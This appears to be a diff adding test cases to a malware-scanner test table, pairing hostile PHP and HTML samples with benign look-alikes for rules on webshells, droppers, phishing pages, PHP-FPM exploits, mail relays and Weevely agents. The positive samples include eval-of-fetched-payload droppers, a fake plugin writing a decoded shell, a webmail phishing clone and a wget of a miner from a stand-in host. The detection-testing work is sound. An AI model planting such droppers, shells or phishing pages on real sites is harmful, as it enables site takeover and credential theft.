@@ -1290,6 +1290,232 @@ eval($_GET['preview']);`,
 			want:     true,
 			sample:   "#!/bin/sh\n/usr/bin/WGET http://evil.test/XMRIG\n",
 		},
+		{
+			name: "standalone Tiny File Manager install",
+			rule: "webshell_tiny_file_manager",
+			want: true,
+			sample: `<?php
+/**
+ * Tiny File Manager
+ * @version 2.4.6
+ */
+$auth_users = array(
+    'admin' => '$2y$10$xhs0AEBvxCLPPmYaMFbCFuUEqTFmvXvUgpIMkgTGF9NLBRcMvbLGO',
+);
+$root_path = $_SERVER['DOCUMENT_ROOT'];
+`,
+		},
+		{
+			name: "security plugin blocklisting the file manager name",
+			rule: "webshell_tiny_file_manager",
+			sample: `<?php
+$known_admin_tools = array('tinyfilemanager.php', 'filemanager.php');
+foreach ($known_admin_tools as $tool) {
+    if (file_exists($docroot . '/' . $tool)) {
+        $this->report_unexpected_tool($tool);
+    }
+}
+`,
+		},
+		{
+			name: "standalone Adminer copy",
+			rule: "webshell_adminer_abuse",
+			want: true,
+			sample: `<?php
+/** Adminer - Compact database management tool
+ * @link https://www.adminer.org/
+ * @author Jakub Vrana
+ */
+function adminer_object() {
+    return new Adminer();
+}
+`,
+		},
+		{
+			name: "security plugin blocklisting the adminer filename",
+			rule: "webshell_adminer_abuse",
+			sample: `<?php
+$suspicious = array('adminer.php', 'adminer-4.8.1.php');
+if (in_array(basename($path), $suspicious, true)) {
+    $this->flag_unexpected_database_tool($path);
+}
+`,
+		},
+		{
+			name: "raw GitHub payload fetched with the HTTP API and evaluated",
+			rule: "php_dropper_raw_github",
+			want: true,
+			sample: `<?php
+$response = wp_remote_get('https://raw.githubusercontent.com/acct/repo/main/stage.txt');
+$body = wp_remote_retrieve_body($response);
+eval($body);
+`,
+		},
+		{
+			name: "plugin updater reading its manifest from raw GitHub",
+			rule: "php_dropper_raw_github",
+			sample: `<?php
+$this->manifest_url = 'https://raw.githubusercontent.com/vendor/plugin/main/update.json';
+$response = wp_remote_get($this->manifest_url);
+$manifest = json_decode(wp_remote_retrieve_body($response), true);
+if (version_compare($manifest['version'], PLUGIN_VERSION, '>')) {
+    $this->notify_update_available($manifest);
+}
+`,
+		},
+		{
+			name: "request payload written into the plugins directory",
+			rule: "dropper_wp_plugin_installer",
+			want: true,
+			sample: `<?php
+$payload = base64_decode($_POST['b']);
+file_put_contents(ABSPATH . 'wp-content/plugins/hello-dolly/hello.php', $payload);
+`,
+		},
+		{
+			name: "plugin writing its own compiled template cache",
+			rule: "dropper_wp_plugin_installer",
+			sample: `<?php
+$target = plugin_dir_path(__FILE__) . 'cache/compiled-header.php';
+if (!file_exists($target)) {
+    file_put_contents($target, $this->render_template('header'));
+}
+`,
+		},
+		{
+			name: "rendered Roundcube login clone",
+			rule: "phishing_webmail",
+			ext:  ".html",
+			want: true,
+			sample: `<!DOCTYPE html>
+<html>
+<head><title>Webmail Login</title></head>
+<body class="roundcube">
+<form action="post.php" method="post">
+  <input type="email" name="_user" placeholder="Email address">
+  <input type="password" name="_pass" placeholder="Password">
+  <button type="submit">Login</button>
+</form>
+</body>
+</html>
+`,
+		},
+		{
+			name: "stock Roundcube template using the dynamic login object",
+			rule: "phishing_webmail",
+			ext:  ".html",
+			sample: `<div id="login-form">
+  <roundcube:object name="loginform" form="form" />
+  <roundcube:button command="login" type="input" class="button mainaction" label="login" />
+</div>
+`,
+		},
+		{
+			name: "webmail landing page linking to the real client",
+			rule: "phishing_webmail",
+			ext:  ".html",
+			sample: `<h1>Webmail Login</h1>
+<p>Look up your mailbox address, then sign in at <a href="/webmail">/webmail</a>.</p>
+<input type="email" name="lookup" placeholder="Email address">
+`,
+		},
+		{
+			name: "PHP-FPM path underflow exploit",
+			rule: "exploit_php_fpm_rce",
+			ext:  ".py",
+			want: true,
+			sample: `import sys
+
+PATH_INFO = "/index.php/PHP" + "\n"
+payload = "auto_prepend_file%0d%0aPHP_VALUE%0d%0aallow_url_include%3DOn"
+send(target, path_info=PATH_INFO, body=payload)
+`,
+		},
+		{
+			name: "firewall installed through auto_prepend_file",
+			rule: "exploit_php_fpm_rce",
+			sample: `<?php
+// Installed by editing .user.ini or the pool PHP_VALUE directive.
+$request_path = isset($_SERVER['PATH_INFO']) ? $_SERVER['PATH_INFO'] : '';
+if (ini_get('auto_prepend_file') === '') {
+    $this->warn_firewall_not_loaded();
+}
+`,
+		},
+		{
+			name: "fake plugin decoding a shell on activation",
+			rule: "exploit_wp_fake_plugin_installer",
+			want: true,
+			sample: `<?php
+/* Plugin Name: SEO Booster */
+register_activation_hook(__FILE__, 'seob_activate');
+function seob_activate() {
+    file_put_contents(ABSPATH . 'wp-includes/rest-api.php', base64_decode($GLOBALS['seob_stage']));
+}
+`,
+		},
+		{
+			name: "plugin creating its cache directory guard on activation",
+			rule: "exploit_wp_fake_plugin_installer",
+			sample: `<?php
+/* Plugin Name: Cache Warmer */
+register_activation_hook(__FILE__, 'cw_install');
+function cw_install() {
+    wp_mkdir_p(plugin_dir_path(__FILE__) . 'cache');
+    file_put_contents(plugin_dir_path(__FILE__) . 'cache/index.php', "<?php // Silence is golden.");
+}
+`,
+		},
+		{
+			name: "PHPMailer relay taking its recipient from the request",
+			rule: "mailer_phpmailer_abuse",
+			want: true,
+			sample: `<?php
+require_once 'vendor/phpmailer/PHPMailer.php';
+$mailer = new PHPMailer(true);
+$mailer->addAddress($_POST['rcpt']);
+$mailer->Subject = $_POST['subject'];
+$mailer->Body = $_POST['body'];
+if (!$mailer->send()) {
+    mail($_POST['rcpt'], $_POST['subject'], $_POST['body']);
+}
+`,
+		},
+		{
+			name: "contact form passing only the sender name from the request",
+			rule: "mailer_phpmailer_abuse",
+			sample: `<?php
+require_once 'vendor/phpmailer/PHPMailer.php';
+$mailer = new PHPMailer();
+$mailer->addAddress(get_option('admin_email'), sanitize_text_field($_POST['name']));
+$mailer->Body = wp_kses_post($_POST['message']);
+$mailer->send();
+mail(get_option('admin_email'), 'Contact form copy', $body);
+`,
+		},
+		{
+			name: "Weevely stager building and calling its agent",
+			rule: "revshell_weevely_agent",
+			want: true,
+			sample: `<?php
+$k="w3ev3ly";
+$o=create_function('$a','eval(base64_decode($a));');
+$p=$o('',$k);$p();
+`,
+		},
+		{
+			name: "create_function shim for PHP 5 compatibility",
+			rule: "revshell_weevely_agent",
+			sample: `<?php
+if (!function_exists('create_function')) {
+    function create_function($args, $code) {
+        return eval('return function(' . $args . ') { ' . $code . '; };');
+    }
+}
+$double = create_function('$x', 'return $x * 2;');
+echo $double(21);
+`,
+		},
 	}
 
 	for _, tc := range tests {
